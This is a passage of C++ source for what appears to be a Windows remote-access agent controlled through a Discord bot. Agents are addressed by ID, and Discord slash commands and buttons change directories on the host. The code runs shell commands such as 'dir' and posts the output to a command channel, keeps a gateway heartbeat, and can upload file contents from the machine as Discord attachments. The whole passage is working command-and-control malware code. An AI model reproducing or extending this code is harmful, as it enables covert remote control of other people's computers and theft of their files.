                                    {"value", "```\n" + statusContents + "\n```"},
                                    {"inline", false}
                                }}},
                                {"color", 0xFF0000},
                                {"footer", {{"text", "Success"}}}
                            };

                            json response = {
                                {"content", ""},
                                {"embeds", {embed}}
                            };
                            SendFollowUp(token, response.dump());
                        }
                    }
#endif
#ifdef ENABLE_CD_DIR
                    else if (commandName == "cd" && channel_id == commands_channel_id) {
                        std::string agentIdStr = root["d"]["data"]["options"][0]["value"].get<std::string>();
                        std::string path = root["d"]["data"]["options"][1]["value"].get<std::string>();
                        int64_t agentId = std::stoll(agentIdStr);

                        std::cout << "Received /cd with agentid: " << agentId << ", path: " << path << std::endl;

                        if (agentId != config::cfg.agent_id) {
                            std::cout << "Dropping command: agentid " << agentId << " does not match local agent_id " << config::cfg.agent_id << std::endl;
                            continue;
                        }

                        RespondDeferred(id, token);

                        json embed;
                        std::wstring wPath(path.begin(), path.end());

                        wchar_t currentDir[MAX_PATH];
                        GetCurrentDirectoryW(MAX_PATH, currentDir);
                        std::wstring wCurrentDir(currentDir);
                        std::string fromPath(wCurrentDir.begin(), wCurrentDir.end());

                        if (SetCurrentDirectoryW(wPath.c_str())) {
                            embed = {
                                {"title", "**Directory Changed Successfully**"},
                                {"description", "Agent ID: " + agentIdStr + "\n**From**\n```\n" + fromPath + "\n```\n**To**\n```\n" + path + "\n```"},
                                {"color", 0x00FF00},
                                {"footer", {{"text", "Success"}}}
                            };
                        }
                        else {
                            DWORD errorCode = GetLastError();
                            std::string footerText = (errorCode == ERROR_ACCESS_DENIED) ? "Permission Denied" : "Error";
                            embed = {
                                {"title", "**Directory Change Failed**"},
                                {"description", "Agent ID: " + agentIdStr + "\n**From**\n```\n" + fromPath + "\n```\n**To**\n```\n" + path + "\n```"},
                                {"color", 0xFF0000},
                                {"footer", {{"text", footerText}}}
                            };
                        }

                        json components = {
                            {
                                {"type", 1},
                                {"components", json::array({
                                    {
                                        {"type", 2},
                                        {"style", 1},
                                        {"label", "List Dir"},
                                        {"custom_id", "list_dir_" + path}
                                    }
                                })}
                            }
                        };

                        json response = {
                            {"content", ""},
                            {"embeds", {embed}},
                            {"components", components}
                        };
                        SendFollowUp(token, response.dump());
                    }
                }
                else if (root["d"]["data"]["component_type"].is_number() && root["d"]["data"]["component_type"] == 2) {
                    std::string customId = root["d"]["data"]["custom_id"].get<std::string>();

                    if (customId.find("list_dir_") == 0 && channel_id == commands_channel_id) {
                        std::string path = customId.substr(9);
                        std::cout << "Received button click: List Dir for path: " << path << std::endl;

                        RespondDeferred(id, token);

                        std::string dirOutput = ExecuteCommand("dir");
                        std::vector<std::string> outputChunks = SplitAndSanitizeOutput(dirOutput, 4096, 1);

                        json embed;
                        if (!dirOutput.empty() && dirOutput.find("The system cannot find the path specified") == std::string::npos) {
                            std::string truncatedOutput = outputChunks[0].substr(0, 4096);
                            embed = {
                                {"title", "**Directory Listing Successful**"},
                                {"description", "Agent ID: " + std::to_string(config::cfg.agent_id) + "\n**Contents**\n```\n" + truncatedOutput + "\n```"},
                                {"color", 0x00FF00},
                                {"footer", {{"text", "Success"}}}
                            };

                            std::vector<std::string> directories;
                            std::regex dirPattern(R"(<DIR>\s+([^\s].*))");
                            std::smatch matches;
                            std::string::const_iterator searchStart(dirOutput.cbegin());
                            while (std::regex_search(searchStart, dirOutput.cend(), matches, dirPattern)) {
                                std::string dirName = matches[1].str();
                                if (dirName != "." && dirName != "..") {
                                    directories.push_back(dirName);
                                }
                                searchStart = matches.suffix().first;
                            }

                            SendFollowUp(token, json{ {"content", ""}, {"embeds", {embed}} }.dump());

                            const int maxButtonsPerMessage = 25;
                            for (size_t i = 0; i < directories.size(); i += maxButtonsPerMessage) {
                                json actionRows = json::array();
                                int buttonsInThisMessage = std::min(maxButtonsPerMessage, static_cast<int>(directories.size() - i));
                                for (int j = 0; j < buttonsInThisMessage; j += 5) {
                                    json row = { {"type", 1}, {"components", json::array()} };
                                    int buttonsInRow = std::min(5, buttonsInThisMessage - j);
                                    for (int k = 0; k < buttonsInRow; ++k) {
                                        std::string dirName = directories[i + j + k];
                                        std::string fullPath = path + (path.back() == '\\' ? "" : "\\") + dirName;
                                        row["components"].push_back({
                                            {"type", 2},
                                            {"style", 1},
                                            {"label", dirName},
                                            {"custom_id", "cd_to_" + fullPath}
                                            });
                                    }
                                    actionRows.push_back(row);
                                }
                                json buttonMessage = { {"content", "Choose a directory to navigate to:"}, {"components", actionRows} };
                                SendChannelMessage(commands_channel_id, buttonMessage.dump());
                            }
                        }
                        else {
                            embed = {
                                {"title", "**Directory Listing Failed**"},
                                {"description", "Agent ID: " + std::to_string(config::cfg.agent_id) + "\n**Contents**\n```\n" + (dirOutput.empty() ? "No output" : dirOutput) + "\n```"},
                                {"color", 0xFF0000},
                                {"footer", {{"text", "Error"}}}
                            };
                            SendFollowUp(token, json{ {"content", ""}, {"embeds", {embed}} }.dump());
                        }
                    }
                    else if (customId.find("cd_to_") == 0 && channel_id == commands_channel_id) {
                        std::string path = customId.substr(6);
                        std::cout << "Received button click: CD to path: " << path << std::endl;

                        RespondDeferred(id, token);

                        json embed;
                        std::wstring wPath(path.begin(), path.end());

                        wchar_t currentDir[MAX_PATH];
                        GetCurrentDirectoryW(MAX_PATH, currentDir);
                        std::wstring wCurrentDir(currentDir);
                        std::string fromPath(wCurrentDir.begin(), wCurrentDir.end());

                        if (SetCurrentDirectoryW(wPath.c_str())) {
                            embed = {
                                {"title", "**Directory Changed Successfully**"},
                                {"description", "Agent ID: " + std::to_string(config::cfg.agent_id) + "\n**From**\n```\n" + fromPath + "\n```\n**To**\n```\n" + path + "\n```"},
                                {"color", 0x00FF00},
                                {"footer", {{"text", "Success"}}}
                            };
                        }
                        else {
                            DWORD errorCode = GetLastError();
                            std::string footerText = (errorCode == ERROR_ACCESS_DENIED) ? "Permission Denied" : "Error";
                            embed = {
                                {"title", "**Directory Change Failed**"},
                                {"description", "Agent ID: " + std::to_string(config::cfg.agent_id) + "\n**From**\n```\n" + fromPath + "\n```\n**To**\n```\n" + path + "\n```"},
                                {"color", 0xFF0000},
                                {"footer", {{"text", footerText}}}
                            };
                        }

                        json components = {
                            {
                                {"type", 1},
                                {"components", json::array({
                                    {
                                        {"type", 2},
                                        {"style", 1},
                                        {"label", "List Dir"},
                                        {"custom_id", "list_dir_" + path}
                                    }
                                })}
                            }
                        };

                        json response = {
                            {"content", ""},
                            {"embeds", {embed}},
                            {"components", components}
                        };
                        SendFollowUp(token, response.dump());
                    }
#endif
                }

            }
            else if (root["op"].is_number() && root["op"] == 10) {
                heartbeatIntervalMs = root["d"]["heartbeat_interval"].get<int>();
                std::cout << "Heartbeat interval: " << heartbeatIntervalMs << "ms" << std::endl;
                json identify = { {"op", 2}, {"d", {{"token", config::cfg.token}, {"intents", 513}, {"properties", {{"os", "windows"}}}}} };
                wsClient.Send(identify.dump());
                if (!heartbeatThread) {
                    heartbeatThread = new std::thread(&EventHandler::SendHeartbeat, this, std::ref(running));
                }
            }
        }
        catch (const json::exception& e) {
            std::cerr << "JSON parse error: " << e.what() << std::endl;
        }
    }
    if (heartbeatThread) {
        heartbeatThread->detach();
        delete heartbeatThread;
    }
}

void EventHandler::SendHeartbeat(bool& running) {
    while (running) {
        std::this_thread::sleep_for(std::chrono::milliseconds(heartbeatIntervalMs));
        json heartbeat = { {"op", 1}, {"d", nullptr} };
        wsClient.Send(heartbeat.dump());
        std::cout << "Sent heartbeat" << std::endl;
    }
}

bool EventHandler::SendFollowUp(const std::string& token, const std::string& content) {
    std::wstring endpoint = L"https://discord.com/api/v10/webhooks/" + config::cfg.w_appId + L"/" +
        std::wstring(token.begin(), token.end()) + L"/messages/@original";
    return httpClient.SendRequest(endpoint, content, config::cfg.token, "PATCH");
}

bool EventHandler::RespondDeferred(const std::string& id, const std::string& token) {
    std::wstring endpoint = L"https://discord.com/api/v10/interactions/" + std::wstring(id.begin(), id.end()) + L"/" +
        std::wstring(token.begin(), token.end()) + L"/callback";
    json responseJson = { {"type", 5} };
    return httpClient.SendRequest(endpoint, responseJson.dump(), config::cfg.token, "POST");
}

bool EventHandler::SendChannelMessage(const std::string& channel_id, const std::string& content,
    const std::string& filePath, const std::string& fileContent) {
    std::wstring endpoint = L"https://discord.com/api/v10/channels/" + std::wstring(channel_id.begin(), channel_id.end()) + L"/messages";

    if (filePath.empty() && fileContent.empty()) {
        try {
            json messageJson = json::parse(content);
            if (messageJson.is_object() && (messageJson.contains("embeds") || messageJson.contains("components"))) {
                bool success = httpClient.SendRequest(endpoint, messageJson.dump(), config::cfg.token, "POST", "application/json");
                if (success) {
                    std::cout << "Sent message with components to channel " << channel_id << std::endl;
                }
                else {
                    std::cerr << "Failed to send message with components to channel " << channel_id << std::endl;
                }
                return success;
            }
        }
        catch (const json::exception&) {
            json messageJson = { {"content", content} };
            bool success = httpClient.SendRequest(endpoint, messageJson.dump(), config::cfg.token, "POST", "application/json");
            if (success) {
                std::cout << "Sent text message to channel " << channel_id << std::endl;
            }
            else {
                std::cerr << "Failed to send text message to channel " << channel_id << std::endl;
            }
            return success;
        }
    }

    std::string boundary = "----CorditeBoundary" + std::to_string(std::chrono::system_clock::now().time_since_epoch().count());
    std::string multipartBody;

    multipartBody += "--" + boundary + "\r\n";
    multipartBody += "Content-Disposition: form-data; name=\"payload_json\"\r\n";
    multipartBody += "Content-Type: application/json\r\n\r\n";
    json payloadJson = { {"content", content} };
    multipartBody += payloadJson.dump() + "\r\n";

    multipartBody += "--" + boundary + "\r\n";
    multipartBody += "Content-Disposition: form-data; name=\"files[0]\"; filename=\"" + filePath.substr(filePath.find_last_of("\\/") + 1) + "\"\r\n";
    multipartBody += "Content-Type: application/octet-stream\r\n\r\n";
    multipartBody += fileContent + "\r\n";
    multipartBody += "--" + boundary + "--\r\n";

    std::string contentType = "multipart/form-data; boundary=" + boundary;
    bool success = httpClient.SendRequest(endpoint, multipartBody, config::cfg.token, "POST", contentType);
    if (success) {
        std::cout << "Sent file message to channel " << channel_id << std::endl;
    }
    else {
        std::cerr << "Failed to send file message to channel " << channel_id << std::endl;
    }
    return success;
}